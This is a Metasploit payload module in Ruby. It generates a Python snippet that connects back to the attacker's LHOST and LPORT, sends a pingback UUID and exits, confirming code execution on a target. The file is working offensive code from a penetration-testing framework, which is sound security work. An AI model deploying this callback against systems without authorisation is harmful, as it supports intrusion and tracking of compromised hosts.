require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/python'

require 'msf/base/sessions/pingback'
require 'msf/core/payload/pingback'

module MetasploitModule

  CachedSize = 184

  include Msf::Payload::Single
  include Msf::Payload::Pingback
  include Msf::Payload::Pingback::Options

  def initialize(info = {})
    super(merge_info(info,
      'Name' => 'Python Pingback, Reverse TCP (via python)',
      'Description' => 'Connects back to the attacker, sends a UUID, then terminates',
      'Author' => 'asoto-r7',
      'License' => MSF_LICENSE,
      'Platform' => 'python',
      'Arch' => ARCH_PYTHON,
      'Handler' => Msf::Handler::ReverseTcp,
      'Session' => Msf::Sessions::Pingback,
      'PayloadType' => 'python'
    ))
  end

  def generate
    super.to_s + command_string
  end

  def command_string
    self.pingback_uuid ||= self.generate_pingback_uuid
    cmd = <<~PYTHON
      import socket as s
      so=s.socket(s.AF_INET,s.SOCK_STREAM)
      try:
       so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))
       so.send('#{[[self.pingback_uuid].pack('H*')].pack('m0')}'.decode('base64'))
       so.close()
      except:
       pass
    PYTHON
  end
end
